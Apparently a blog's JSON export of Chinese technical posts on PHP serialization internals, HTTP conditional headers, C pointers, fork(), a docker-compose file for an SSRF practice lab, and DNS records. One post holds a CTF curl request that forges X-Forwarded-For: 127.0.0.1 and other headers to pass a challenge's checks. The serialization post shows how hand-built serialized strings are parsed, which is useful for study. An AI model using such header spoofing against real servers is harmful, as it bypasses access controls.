表示对象中的字段1个数。这些字段包括在对象所在类及其祖先类中用 var、public、protected 和 private 声明的字段，但是不包括 static 和 const 声明的静态字段。也就是说只有实例（instance）字段。&lt;filed name 1&gt;、&lt;filed name 2&gt;……&lt;filed name n&gt;表示每个字段的字段名，而 &lt;filed value 1&gt;、&lt;filed value 2&gt;……&lt;filed value n&gt; 则表示与字段名所对应的字段值。 字段名是字符串型，序列化后格式与字符串型数据序列化后的格式相同。 字段值可以是任意类型，其序列化后的格式与其所对应的类型序列化后的格式相同。 但字段名的序列化与它们声明的可见性是有关的，下面重点讨论一下关于字段名的序列化。 4.3．对象字段名的序列化 var 和 public 声明的字段都是公共字段，因此它们的字段名的序列化格式是相同的。公共字段的字段名按照声明时的字段名进行序列化，但序列化后的字段名中不包括声明时的变量前缀符号 $。 protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上 \\0*\\0 的前缀。这里的 \\0 表示 ASCII 码为 0 的字符，而不是 \\0 组合。 private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，字段名前面会加上 \\0&lt;declared class name&gt;\\0 的前缀。这里 &lt;declared class name&gt; 表示的是声明该私有字段的类的类名，而不是被序列化的对象的类名。因为声明该私有字段的类不一定是被序列化的对象的类，而有可能是它的祖先类。 字段名被作为字符串序列化时，字符串值中包括根据其可见性所加的前缀。字符串长度也包括所加前缀的长度。其中 \\0 字符也是计算长度的。 1注： 在 PHP 手册中，字段被称为属性，而实际上，在 PHP 5 中引入的用 __set、__get 来定义的对象成员更适合叫做属性。因为用 __set、__get 来定义的对象成员与其它语言中的属性的行为是一致，而 PHP 手册中所说的属性实际上在其他语言中（例如：C#）中被称为字段，为了避免混淆，这里也称为字段，而不是属性。 5．嵌套复合类型的序列化 上一章讨论了简单的复合类型的序列化，大家会发现对于简单的数组和对象其实也很容易。但是如果遇到自己包含自己或者 A 包含 B，B 又包含 A 这类的对象或数组时，PHP 又该如何序列化这种对象和数组呢？本章我们就来讨论这种情况下的序列化形式。 5.1．对象引用和指针引用 在 PHP 中，标量类型数据是值传递的，而复合类型数据（对象和数组）是引用传递的。但是复合类型数据的引用传递和用 &amp; 符号明确指定的引用传递是有区别的，前者的引用传递是对象引用，而后者是指针引用。 在解释对象引用和指针引用之前，先让我们看几个例子。 1234567891011121314151617&lt;?php echo &quot;&lt;pre&gt;&quot;; class SampleClass &#123; var $value; &#125; $a = new SampleClass(); $a-&gt;value = $a; $b = new SampleClass(); $b-&gt;value = &amp;$b; echo serialize($a); echo &quot;\\n&quot;; echo serialize($b); echo &quot;\\n&quot;; echo &quot;&lt;/pre&gt;&quot;; ?&gt; 这个例子的输出结果是这样的： O:11:“SampleClass”:1:{s:5:“value”;r:1;} O:11:“SampleClass”:1:{s:5:“value”;R:1;} 大家会发现，这里变量 $a 的 value 字段的值被序列化成了 r:1，而 $b 的 value 字段的值被序列化成了 R:1。 但是对象引用和指针引用到底有什么区别呢？ 大家可以看下面这个例子： 12345678910111213141516echo &quot;&lt;pre&gt;&quot;; class SampleClass &#123; var $value; &#125; $a = new SampleClass(); $a-&gt;value = $a; $b = new SampleClass(); $b-&gt;value = &amp;$b; $a-&gt;value = 1; $b-&gt;value = 1; var_dump($a); var_dump($b); echo &quot;&lt;/pre&gt;&quot;; 大家会发现，运行结果也许出乎你的预料： 12345object(SampleClass)#1 (1) &#123; [&quot;value&quot;]=&gt; int(1) &#125; int(1) 改变 $a-&gt;value 的值仅仅是改变了 $a-&gt;value 的值，而改变 $b-&gt;value 的值却改变了 $b 本身，这就是对象引用和指针引用的区别。 不过很不幸的是，PHP 对数组的序列化犯了一个错误，虽然数组本身在传递时也是对象引用传递，但是在序列化时，PHP 似乎忘记了这一点，看下面的例子： 12345678910echo &quot;&lt;pre&gt;&quot;; $a = array(); $a[1] = 1; $a[&quot;value&quot;] = $a; echo $a[&quot;value&quot;][&quot;value&quot;][1]; echo &quot;\\n&quot;; $a = unserialize(serialize($a)); echo $a[&quot;value&quot;][&quot;value&quot;][1]; echo &quot;&lt;/pre&gt;&quot;; 结果是： 1 大家会发现，将原数组序列化再反序列化后，数组结构变了。原本 $a[“value”][“value”][1] 中的值 1，在反序列化之后丢失了。 原因是什么呢？让我们输出序列化之后的结果来看一看： 12345$a = array(); $a[1] = 1; $a[&quot;value&quot;] = $a; echo serialize($a); 结果是： 1a:2:&#123;i:1;i:1;s:5:&quot;value&quot;;a:2:&#123;i:1;i:1;s:5:&quot;value&quot;;N;&#125;&#125; 原来，序列化之后，$a[“value”][“value”] 变成了 NULL，而不是一个对象引用。 也就是说，PHP 只对对象在序列化时才会生成对象引用标示（r）。对所有的标量类型和数组（也包括 NULL）序列化时都不会生成对象引用。但是如果明确使用了 &amp; 符号作的引用，在序列化时，会被序列化为指针引用标示（R）。 5.2．引用标示后的数字 在上面的例子中大家可能已经看到了，对象引用（r）和指针引用（R）的格式为： r:; R:; 大家一定很奇怪后面这个 是什么吧？本节我们就来详细讨论这个问题。 这个 简单的说，就是所引用的对象在序列化串中第一次出现的位置，但是这个位置不是指字符的位置，而是指对象（这里的对象是泛指所有类型的量，而不仅限于对象类型）的位置。 我想大家可能还不是很明白，那么我来举例说明一下： 12345678910111213141516class ClassA &#123; var $int; var $str; var $bool; var $obj; var $pr; &#125; $a = new ClassA(); $a-&gt;int = 1; $a-&gt;str = &quot;Hello&quot;; $a-&gt;bool = false; $a-&gt;obj = $a; $a-&gt;pr = &amp;$a-&gt;str; echo serialize($a); 这个例子的结果是： 1O:6:&quot;ClassA&quot;:5:&#123;s:3:&quot;int&quot;;i:1;s:3:&quot;str&quot;;s:5:&quot;Hello&quot;;s:4:&quot;bool&quot;;b:0;s:3:&quot;obj&quot;;r:1;s:2:&quot;pr&quot;;R:3;&#125; 在这个例子中，首先序列化的对象是 ClassA 的一个对象，那么给它编号为 1，接下来要序列化的是这个对象的几个成员，第一个被序列化的成员是 int 字段，那它的编号就为 2，接下来被序列化的成员是 str，那它的编号就是 3，依此类推，到了 obj 成员时，它发现该成员已经被序列化了，并且编号为 1，因此它被序列化时，就被序列化成了 r:1; ，在接下来被序列化的是 pr 成员，它发现该成员实际上是指向 str 成员的一个引用，而 str 成员的编号为 3，因此，pr 就被序列化为 R:3; 了。 PHP 是如何来编号被序列化的对象的呢？实际上，PHP 在序列化时，首先建立一个空表，然后每个被序列化的对象在被序列化之前，都需要先计算该对象的 Hash 值，然后判断该 Hash 值是否已经出现在该表中了，如果没有出现，就把该 Hash 值添加到这个表的最后，返回添加成功。如果出现了，则返回添加失败，但是在返回失败前先判断该对象是否是一个引用（用 &amp; 符号定义的引用），如果不是则也把 Hash 值添加到表后（尽管返回的是添加失败）。如果返回失败，则同时返回上一次出现的位置。 在添加 Hash 值到表中之后，如果添加失败，则判断添加的是一个引用还是一个对象，如果是引用，则返回 R 标示，如果是对象，则返回 r 标示。因为失败时，会同时返回上一次出现的位置，因此，R 和 r 标示后面的数字，就是这个位置。 5.3．对象引用的反序列化 PHP 在反序列化处理对象引用时很有意思，如果反序列化的字符串不是 PHP 的 serialize() 本身生成的，而是人为构造或者用其它语言生成的，即使对象引用指向的不是一个对象，它也能正确地按照对象引用所指向的数据进行反序列化。例如： 12345678910echo &quot;&lt;pre&gt;&quot;; class StrClass &#123; var $a; var $b; &#125; $a = unserialize(&#x27;O:8:&quot;StrClass&quot;:2:&#123;s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;r:2;&#125;&#x27;); var_dump($a); echo &quot;&lt;/pre&gt;&quot;; 运行结果： 123456object(StrClass)#1 (2) &#123; [&quot;a&quot;]=&gt; string(5) &quot;Hello&quot; [&quot;b&quot;]=&gt; string(5) &quot;Hello&quot; &#125; 大家会发现，上面的例子反序列化后，$a-&gt;b 的值与 $a-&gt;a 的值是一样的，尽管 $a-&gt;a 不是一个对象，而是一个字符串。因此如果大家用其它语言来实现序列化的话，不一定非要把 string 作为标量类型来处理，即使按照对象引用来序列化拥有相同字符串内容的复合类型，用 PHP 同样可以正确的反序列化。这样可以更节省序列化后的内容所占用的空间。 6．自定义对象序列化 6.1．PHP 4 中自定义对象序列化 PHP 4 中提供了 __sleep 和 __wakeup 这两个方法来自定义对象的序列化。不过这两个函数并不改变对象序列化的格式，影响的仅仅是被序列化字段的个数。关于它们的介绍，在 PHP 手册中写的还算比较详细。这里就不再多做介绍了。 6.2．PHP 5 中自定义对象序列化 PHP 5 中增加了接口（interface）功能。PHP 5 本身提供了一个 Serializable 接口，如果用户在自己定义的类中实现了这个接口，那么在该类的对象序列化时，就会被按照用户实现的方式去进行序列化，并且序列化后的标示不再是 O，而改为 C。C 标示的格式如下： C:&lt;name length&gt;:“&lt;class name&gt;”:&lt;data length&gt;:{&lt;data&gt;} 其中 &lt;name length&gt; 表示类名 &lt;class name&gt; 的长度，&lt;data length&gt; 表示自定义序列化数据 &lt;data&gt; 的长度，而自定义的序列化数据 &lt;data&gt; 是完全的用户自己定义的格式，与 PHP 序列化格式可以完全无关，这部分数据由用户自己实现的序列化和反序列化接口方法来管理。 Serializable 接口中定义了 2 个方法，serialize() 和 unserialize(data)，这两个方法不会被直接调用，而是在调用 PHP 序列化函数时，被自动调用。其中 serialize 函数没有参数，它的返回值就是 \\ 的内容。而 unserialize(data) 有一个参数 data，这个参数的值就是 \\ 的内容。这样大家应该就明白了，实际上接口中 serialize 方法就是让用户来自己序列化对象中的内容，序列化后的内容格式，PHP 并不关心，PHP 只负责把它充填到 \\ 中，等到反序列化时，PHP 只负责取出这部分内容，然后传给用户实现的 unserialize(data) 接口方法，让用户自己去反序列化这部分内容。 下面举个简单的例子，来说明 Serializable 接口的使用： 1234567891011121314151617181920212223class MyClass implements Serializable &#123; public $member; function MyClass() &#123; $this-&gt;member = &#x27;member value&#x27;; &#125; public function serialize() &#123; return wddx_serialize_value($this-&gt;member); &#125; public function unserialize($data) &#123; $this-&gt;member = wddx_deserialize($data); &#125; &#125; $a = new MyClass(); echo serialize($a); echo &quot;\\n&quot;; print_r(unserialize(serialize($a))); 输出结果为（浏览器中的源代码）： C:7:“MyClass”:90:{&lt;wddxPacket version=‘1.0’&gt;&lt;header/&gt;&lt;string&gt;member value&lt;/string&gt;&lt;/wddxPacket&gt;} MyClass Object ( [member] =&gt; member value ) 因此如果想用其它语言来实现 PHP 序列化中的 C 标示的话，也需要提供一种这样的机制，让用户自定义类时,能够自己在反序列化时处理&lt;data&gt; 内容，否则，这些内容就无法被反序列化了。 7．Unicode 字符串的序列化 好了，最后再谈谈 PHP 6 中关于 Unicode 字符串序列化的问题吧。 说实话，我不怎么喜欢把字符串搞成双字节 Unicode 这种编码的东西。JavaScript 中也是用这样的字符串，因此在处理字节流的东西时，反而非常的不方便。C# 虽然也是用这种方式来编码字符串，不过还好的是，它提供了全面的编码转换机制，而且提供这种字符串到字节流（实际上是到字节数组）的转换，所以处理起来还 算是可以。但是对于不熟悉这个的人来说，转来转去就是个麻烦。 PHP 6 之前一直是按字节来编码字符串的，到了 PHP 6 突然冒出个 Unicode 编码的字符串来，虽然是可选的，但仍然让人觉得非常不舒服，如果配置不当，老的程序兼容性都成问题。 当然加了这个东西以后，许多老的与字符串有关的函数都进行了修改。序列化函数也不例外。因此，PHP 6 中增加了专门的 Unicode 字符串序列化标示 U。PHP 6 中对 Unicode 字符串的序列化格式如下： U:&lt;length&gt;:“&lt;unicode string&gt;”; 这里 &lt;length&gt; 是指原 Unicode String 的长度，而不是 &lt;unicode string&gt; 的长度，因为 &lt;unicode string&gt; 是经过编码以后的字节流了。 但是还有一点要注意，&lt;length&gt; 尽管是原 Unicode String 的长度，但是也不是只它的字节数，当然也不完全是指它的字符数，确切的说是之它的字符单位数。因为 Unicode String 中采用的是 UTF16 编码，这种编码方式使用 16 位来表示一个字符的，但是并不是所有的都是可以用 16 位表示的，因此有些字符需要两个 16 位来表示一个字符。因此，在 UTF16 编码中，16 位字符算作一个字符单位，一个实际的字符可能就是一个字符单位，也有可能由两个字符单位组成。因此， Unicode String 中字符数并不总是等于字符单位数，而这里的 &lt;length&gt; 指的就是字符单位数，而不是字符数。 那 &lt;unicode string&gt; 又是怎样被编码的呢？实际上，它的编码也很简单，对于编码小于 128 的字符（但不包括 \\），按照单个字节写入，对于大于 128 的字符和 \\ 字符，则转化为 16 进制编码的字符串，以 \\ 作为开头，后面四个字节分别是这个字符单位的 16 进制编码，顺序按照由高位到低位排列，也就是第 16-13 位所对应的16进制数字字符（abcdef 这几个字母是小写）作为第一个字节，第 12-9 位作为第二个字节，第 8-5 位作为第三个字节，最后的第 4-1 位作为第四个字节。依次编码下来，得到的就是 &lt;uncode string&gt; 的内容了。 我认为对于其他语言来说，没有必要实现这种序列化方式，因为用这种方式序列化的内容，对于目前的主流 PHP 服务器来说都是不支持的，不过倒是可以实现它的反序列化，这样将来即使跟 PHP 6 进行数据交换，也可以互相读懂了。 8 私有属性 保护属性 公有属性 注意看到图中红色标记的位置，原本我们对象中的字段名应该是 s2 和 s3 ，长度为2，但是经过序列化之后，一个变成了5，一个变成了8。这是因为，在对于protected和private属性的字段进行序列化时，会有不同的特殊标志。具体说明如下： var 和 public 声明的字段都是公共字段，因此它们的字段名的序列化格式是相同的。公共字段的字段名按照声明时的字段名进行序列化，但序列化后的字段名中不包括声明时的变量前缀符号 $。 protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上 \\0*\\0 的前缀，注意，这里的 \\0 表示 ASCII 码为 0 的字符，也就是我们经过 urlencode 后看到的 %00 。 private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，字段名前面会加上 \\0&lt;declared class name&gt;\\0 的前缀，这里 &lt;declared class name&gt; 表示的是声明该私有字段的类的类名，而不是被序列化的对象的类名。因为声明该私有字段的类不一定是被序列化的对象的类，而有可能是它的祖先类。 在进行长度计算的时候，会把 \\0 也计算上 9．参考文献 PHP 3 中关于序列化和反序列化的源代码 PHP 4 中关于序列化的源代码 PHP 4 中关于反序列化的源代码 PHP 5 中关于序列化的源代码 PHP 5 中关于反序列化的源代码 PHP 6 中关于序列化的源代码 PHP 6 中关于反序列化的源代码 PHP 手册中关于序列化和反序列化的介绍 Using Serialized PHP with Yahoo! Web Services 膘叔"},{"title":"web条件式请求-时间","date":"2020-01-29","updated":"2024-03-19","path":"2020/01/29/web条件式请求-时间/","text":"If-Unmodified-Since HTTP协议中的 If-Unmodified-Since 消息头用于请求之中，使得当前请求成为条件式请求：只有当资源在指定的时间之后没有进行过修改的情况下，服务器才会返回请求的资源，或是接受 POST 或其他 non-safe 方法的请求。如果所请求的资源在指定的时间之后发生了修改，那么会返回 412 (Precondition Failed) 错误。 常见的应用场景有两种： 与 non-safe 方法如 POST 搭配使用，可以用来优化并发控制，例如在某些wiki应用中的做法：假如在原始副本获取之后，服务器上所存储的文档已经被修改，那么对其作出的编辑会被拒绝提交。 与含有 If-Range 消息头的范围请求搭配使用，用来确保新的请求片段来自于未经修改的文档。 指令 \"Mon\", \"Tue\", \"Wed\", \"Thu\", \"Fri\", \"Sat\" 或 \"Sun\" 之一 （区分大小写）。 两位数字表示的天数, 例如\"04\" or \"23\"。 \"Jan\", \"Feb\", \"Mar\", \"Apr\", \"May\", \"Jun\", \"Jul\", \"Aug\", \"Sep\", \"Oct\", \"Nov\", \"Dec\" 之一（区分大小写）。 4位数字表示的年份, 例如 \"1990\" 或者\"2016\"。 两位数字表示的小时数, 例如 \"09\" 或者 \"23\"。 两位数字表示的分钟数，例如\"04\" 或者 \"59\"。 两位数字表示的秒数，例如 \"04\" 或者 \"59\"。 GMT 国际标准时间。HTTP中的时间均用国际标准时间表示，从来不使用当地时间。 示例 1If-Unmodified-Since: Wed, 21 Oct 2015 07:28:00 GMT CTF curl -X GET \\ ​ http://kyaru.hgame.n3ko.co/ \\ ​ -H ‘Host: kyaru.hgame.n3ko.co’ \\ ​ -H ‘If-Unmodified-Since: Tue, 7 Oct 2077 00:00:00 GMT’ \\ ​ -H ‘Referer: vidar.club’ \\ ​ -H ‘User-Agent: Cosmos’ \\ - ​ H ‘X-Forwarded-For: 127.0.0.1’"},{"title":"++aa++","date":"2020-01-14","updated":"2024-03-19","path":"2020/01/14/aa/","text":"您细品～ 1234567891011121314151617#include &lt;iostream&gt;using namespace std;int main()&#123; int arr[] = &#123; 6, 7, 8, 9, 10 &#125;; int *ptr = arr; //ptr指向6 *(ptr++) += 123;//先执行6+123，然后ptr指向7 printf(&quot;%d,%d\\n&quot;, *ptr, *(++ptr));//先执行ptr+4使得ptr指向8，然后把ptr压栈2次 printf(&quot;%d,%d,%d,%d,%d\\n&quot;, *ptr--,*ptr+20, *(ptr--), *ptr, *(++ptr)); int i = 5; char ch = &#x27;t&#x27;; char str[10] = &quot;test&quot;; printf(&quot;%s %c %d\\n&quot;, str, ch, i); printf(&quot;%d %d %d %d\\n&quot;, i, --i, i, i--); system(&quot;pause&quot;); return 0;&#125;"},{"title":"fork","date":"2020-01-14","updated":"2024-03-19","path":"2020/01/14/fork/","text":"一个进程，包括代码、数据和分配给进程的资源。fork（）函数通过系统调用创建一个与原来进程几乎完全相同的进程， 也就是两个进程可以做完全相同的事，但如果初始参数或者传入的变量不同，两个进程也可以做不同的事。 一个进程调用fork（）函数后，系统先给新的进程分配资源，例如存储数据和代码的空间。然后把原来的进程的所有值都复制到新的新进程中，只有少数值与原来的进程的值不同。相当于克隆了一个自己。 fork调用的一个奇妙之处就是它仅仅被调用一次，却能够返回两次，它可能有三种不同的返回值： 1）在父进程中，fork返回新创建子进程的进程ID； 2）在子进程中，fork返回0； 3）如果出现错误，fork返回一个负值； 在fork函数执行完毕后，如果创建新进程成功，则出现两个进程，一个是子进程，一个是父进程。在子进程中，fork函数返回0，在父进程中， fork返回新创建子进程的进程ID。我们可以通过fork返回的值来判断当前进程是子进程还是父进程。 引用一位网友的话来解释fpid的值为什么在父子进程中不同。“其实就相当于链表，进程形成了链表，父进程的fpid(p 意味point)指向子进程的进程id, 因为子进程没有子进程，所以其fpid为0. fork出错可能有两种原因： 1）当前的进程数已经达到了系统规定的上限，这时errno的值被设置为EAGAIN。 2）系统内存不足，这时errno的值被设置为ENOMEM。 创建新进程成功后，系统中出现两个基本完全相同的进程，这两个进程执行没有固定的先后顺序，哪个进程先执行要看系统的进程调度策略。 每个进程都有一个独特（互不相同）的进程标识符（process ID），可以通过getpid（）函数获得，还有一个记录父进程pid的变量，可以通过getppid（）函数获得变量的值。 fork执行完毕后，出现两个进程 fork()函数自身不保证子进程和父进程的执行顺序 fork是把进程当前的情况拷贝一份，执行fork时，进程已经执行完了int count=0; fork只拷贝下一个要执行的代码到新的进程。 Linux中的fork fork（）会产生一个和父进程完全相同的子进程，但子进程在此后多会exec系统调用，出于效率考虑，linux中引入了“写时复制“技术，也就是只有进程空间的各段的内容要发生变化时，才会将父进程的内容复制一份给子进程。在fork之后exec之前两个进程用的是相同的物理空间（内存区），子进程的代码段、数据段、堆栈都是指向父进程的物理空间，也就是说，两者的虚拟空间不同，但其对应的物理空间是同一个。当父子进程中有更改相应段的行为发生时，再为子进程相应的段分配物理空间，如果不是因为exec，内核会给子进程的数据段、堆栈段分配相应的物理空间（至此两者有各自的进程空间，互不影响），而代码段继续共享父进程的物理空间（两者的代码完全相同）。而如果是因为exec，由于两者执行的代码不同，子进程的代码段也会分配单独的物理空间。 具体过程是这样的： fork子进程完全复制父进程的栈空间，也复制了页表，但没有复制物理页面，所以这时虚拟地址相同，物理地址也相同，但是会把父子共享的页面标记为“只读”（类似mmap的private的方式），如果父子进程一直对这个页面是同一个页面，知道其中任何一个进程要对共享的页面“写操作”，这时内核会复制一个物理页面给这个进程使用，同时修改页表。而把原来的只读页面标记为“可写”，留给另外一个进程使用。 这就是所谓的“写时复制”。正因为fork采用了这种写时复制的机制，所以fork出来子进程之后，父子进程哪个先调度呢？内核一般会先调度子进程，因为很多情况下子进程是要马上执行exec，会清空栈、堆。。这些和父进程共享的空间，加载新的代码段。。。，这就避免了“写时复制”拷贝共享页面的机会。如果父进程先调度很可能写共享页面，会产生“写时复制”的无用功。所以，一般是子进程先调度滴。 样例代码存在着父进程在子进程结束前结束的可能性。必要的时候可以使用wait或 waitpid函数让父进程等待子进程的结束并获取子进程的返回状态。 fork的另一个特性是所有由父进程打开的描述符都被复制到子进程中。父、子进程中相同编号的文件描述符在内核中指向同一个file结构体，也就是说，file结构体的引用计数要增加。 fork linux fork函数的精辟解说 fork之后子进程到底复制了父进程什么 fork和写时复制"},{"title":"Docker-COmpose模板文件","date":"2020-01-14","updated":"2024-03-19","path":"2020/01/14/Docker-COmpose模板文件/","text":"Docker官网 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263version: &#x27;2&#x27;services: # 基本环境 nginx: container_name: &quot;nginx&quot; image: nginx build: ./nginx command: nginx -g &#x27;daemon off;&#x27; restart: always # 数据卷 volumes: - &quot;$PWD/nginx/code:/usr/share/nginx/html&quot; - &quot;$PWD/nginx/nginx.conf:/etc/nginx/nginx.conf&quot; - &quot;$PWD/nginx/nginx_conf.conf:/etc/nginx/conf.d/default.conf&quot; ports: - 80:80 networks: ssrf: ipv4_address: 10.10.1.3 php: container_name: &quot;php&quot; # build 该置顶目录下的dockerfile build: ./php # image指定build Dockerfile生成镜像的名称 image: php:7.0-fpm-mysqli expose: - 9000 volumes: - &quot;$PWD/php/code:/var/www/html&quot; - &quot;$PWD/php/php.ini:/usr/local/etc/php/php.ini&quot; networks: ssrf: ipv4_address: 10.10.1.5 vuln-nginx: container_name: &quot;vuln-nginx&quot; image: nginx build: ./vuln-nginx command: nginx -g &#x27;daemon off;&#x27; restart: always # 数据卷 volumes: - &quot;$PWD/vuln-nginx/code:/usr/share/nginx/html&quot; - &quot;$PWD/nginx/nginx.conf:/etc/nginx/nginx.conf&quot; - &quot;$PWD/nginx/nginx_conf.conf:/etc/nginx/conf.d/default.conf&quot; expose: - 80 networks: ssrf: ipv4_address: 10.10.1.6networks: # 配置docker network ssrf: driver: bridge ipam: config: # 子网络 - subnet: 10.10.1.0/16 Docker-Compose标准模板文件应该包含version、services、networks 三大部分，最关键的是services和networks两个部分。 Image image是指定服务的镜像名称或镜像ID。如果镜像在本地不存在，Compose将会尝试拉取镜像。 123services: web: image: hello-world build 服务除了可以基于指定的镜像，还可以基于一份Dockerfile，在使用up启动时执行构建任务，构建标签是build，可以指定Dockerfile所在文件夹的路径。Compose将会利用Dockerfile自动构建镜像，然后使用镜像启动服务容器。 build: /path/to/build/dir 也可以是相对路径，只要上下文确定就可以读取到Dockerfile。 build: ./dir 设定上下文根目录，然后以该目录为准指定Dockerfile。 123build: context: ../ dockerfile: path/of/Dockerfile build都是一个目录，如果要指定Dockerfile文件需要在build标签的子级标签中使用dockerfile标签指定。 如果同时指定image和build两个标签，那么Compose会构建镜像并且把镜像命名为image值指定的名字。 command 使用command可以覆盖容器启动后默认执行的命令。 command: bundle exec thin -p 3000 ports ports用于映射端口的标签。 使用HOST:CONTAINER格式或者只是指定容器的端口，宿主机会随机映射端口。 12345ports: - &quot;3000&quot; - &quot;8000:8000&quot; - &quot;49100:22&quot; - &quot;127.0.0.1:8001:8001&quot; 当使用HOST:CONTAINER格式来映射端口时，如果使用的容器端口小于60可能会得到错误得结果，因为YAML将会解析xx:yy这种数字格式为60进制。所以建议采用字符串格式。 volumes 挂载一个目录或者一个已存在的数据卷容器，可以直接使用 [HOST:CONTAINER]格式，或者使用[HOST:CONTAINER:ro]格式，后者对于容器来说，数据卷是只读的，可以有效保护宿主机的文件系统。 Compose的数据卷指定路径可以是相对路径，使用 . 或者 … 来指定相对目录。 数据卷的格式可以是下面多种形式： 1234567891011volumes: // 只是指定一个路径，Docker 会自动在创建一个数据卷（这个路径是容器内部的）。 - /var/lib/mysql // 使用绝对路径挂载数据卷 - /opt/data:/var/lib/mysql // 以 Compose 配置文件为中心的相对路径作为数据卷挂载到容器。 - ./cache:/tmp/cache // 使用用户的相对路径（~/ 表示的目录是 /home/&lt;用户目录&gt;/ 或者 /root/）。 - ~/configs:/etc/configs/:ro // 已经存在的命名的数据卷。 - datavolume:/var/lib/mysql 如果不使用宿主机的路径，可以指定一个volume_driver。 volume_driver: mydriver links 链接到其它服务中的容器。使用服务名称（同时作为别名），或者“服务名称:服务别名”（如 SERVICE:ALIAS），例如： 1234links: - db - db:database - redis 使用别名将会自动在服务容器中的/etc/hosts里创建。例如： 123172.17.2.186 db172.17.2.186 database172.17.2.187 redis net 设置网络模式。 123net: &quot;bridge&quot;net: &quot;none&quot;net: &quot;host&quot; 参考资料"},{"title":"Hexo坏了怎么办","date":"2019-12-16","updated":"2024-03-19","path":"2019/12/16/Hexo坏了怎么办/","text":"那就坏了吧… 把本地的做个备份 把本地的删了！ 远程克隆过来！ 简单粗暴！ok！"},{"title":"虚拟机又莫名奇妙的出问题了-这个仇记下来","date":"2019-12-09","updated":"2024-03-19","path":"2019/12/09/虚拟机又莫名奇妙的出问题了-这个仇记下来/","text":"zxczxc"},{"title":"DNS记录类型","date":"2019-12-08","updated":"2024-03-19","path":"2019/12/08/DNS记录类型/","text":"A记录： 将域名指向一个IPv4地址（例如：100.100.100.100），需要增加A记录 CNAME记录： 如果将域名指向一个域名，实现与被指向域名相同的访问效果，需要增加CNAME记录。这个域名一般是主机服务商提供的一个域名 MX记录： 建立电子邮箱服务，将指向邮件服务器地址，需要设置MX记录。建立邮箱时，一般会根据邮箱服务商提供的MX记录填写此记录 NS记录： 域名解析服务器记录，如果要将子域名指定某个域名服务器来解析，需要设置NS记录 TXT记录： 可任意填写，可为空。一般做一些验证记录时会使用此项，如：做SPF（反垃圾邮件）记录 AAAA记录： 将主机名（或域名）指向一个IPv6地址（例如：ff03:0:0:0:0:0:0:c1），需要添加AAAA记录 SRV记录： 添加服务记录服务器服务记录时会添加此项，SRV记录了哪台计算机提供了哪个服务。格式为：服务的名字.协议的类型（例如：_example-server._tcp）。 SOA记录： SOA叫做起始授权机构记录，NS用于标识多台域名解析服务器，SOA记录用于在众多NS记录中那一台是主服务器 PTR记录： PTR记录是A记录的逆向记录，又称做IP反查记录或指针记录，负责将IP反向解析为域名 显性URL转发记录： 将域名指向一个http(s)协议地址，访问域名时，自动跳转至目标地址。例如：将www.liuht.cn显性转发到www.itbilu.com后，访问www.liuht.cn时，地址栏显示的地址为：www.itbilu.com。 隐性UR转发记录L： 将域名指向一个http(s)协议地址，访问域名时，自动跳转至目标地址，隐性转发会隐藏真实的目标地址。例如：将www.liuht.cn显性转发到www.itbilu.com后，访问www.liuht.cn时，地址栏显示的地址仍然是：www.liuht.cn。 SOA与NS记录 SOA 这种记录是所有区域性文件中的强制性记录。它必须是一个文件中的第一个记录（$ORIGIN 和 $TTL 会在它之前指定）。开始权限记录的看起来像这样： 1domain.com. IN SOA ns1.domain.com. admin.domain.com. ( 12083 ; serial number 3h ; refresh interval 30m ; retry interval 3w ; expiry period 1h ; negative TTL ) 解释一下各部分分别表示什么：domain.com.：这是区域的根。这表明该区域文件用于 http://domain.com 域名。通常，你会看到这个用 @ 代替，它只是一个占位符，表示我们之前学到的 $ORIGIN 变量的内容。 IN SOA：”IN” 部分表示互联网（它会出现在许多记录中）。SOA 是表示这是开始权限记录。 ns1.domain.com.：这定义了该域的主名称服务器。名称服务器可以是主服务器或从服务器，如果配置了动态 DNS，就像这里，则一个服务器需要是 “主服务器”。如果你未配置动态 DNS，那么这只是你其中一个主名称服务器。 admin.domain.com.：这是这个区域文件管理员的邮箱地址。邮箱地址的 @ 这里用一个 . 代替。如果你的名字中也有 . 它会用 \\ 代替。（比如 your.name@domain.com 变成 your[http://name.domain.com](https://link.zhihu.com/?target=http%3A//name.domain.com)） 12083：这是区域文件的序列号。每次编辑区域文件时，必须增加此序列号以使区域文件能够正确传播。从服务器将检查主服务器的区域序列号是否大于它们在系统上的序列号。如果是，它请求新的区域文件，如果不是，它继续服务原始文件。 3h：这是区域的刷新间隔。这是从服务器向主服务器轮询检查区域文件是否变更之间等待的时间量。 30m：这是此区域的重试间隔。如果从机在刷新周期结束时无法连接到主机，则它将等待此时间并重试轮询主机。 3w：这是到期时间。如果从服务器在此时间内无法与主服务器联系，则它不再作为此区域的权威来源的返回响应。 1h：这是名称服务器在此文件中找不到所请求的名称时缓存找不到结果的时间量。 NS服务器里有两个比较重要的记录。一个叫SOA记录（起始授权机构） 一个叫NS（Name Server）记录（域名服务器）关于这两个记录，很多文章都有解释，但是很多人还是很糊涂。我现在通俗的解释一下这两个记录是干什么的。如果理解有错误，欢迎高手来指正。 SOA记录表明了DNS服务器之间的关系。SOA记录表明了谁是这个区域的所有者。比如51CTO.COM这个区域。一个DNS服务器安装后，需要创建一个区域，以后这个区域的查询解析，都是通过DNS服务器来完成的。现在来说一下所有者，我这里所说的所有者，就是谁对这个区域有修改权利。常见的DNS服务器只能创建一个标准区域，然后可以创建很多个辅助区域。标准区域是可以读写修改的。而辅助区域只能通过标准区域复制来完成，不能在辅助区域中进行修改。而创建标准区域的DNS就会有SOA记录，或者准确说SOA记录中的主机地址一定是这个标准区域的服务器IP地址。 https://www.sfn.cn/news/technology/detail/214.html?navId=22 一、什么是NS记录？ ​ NS(Name Server）记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析。 二、使用场景 ​ 如果需要把子域名交给其他DNS服务商解析，就需要添加NS记录（Name 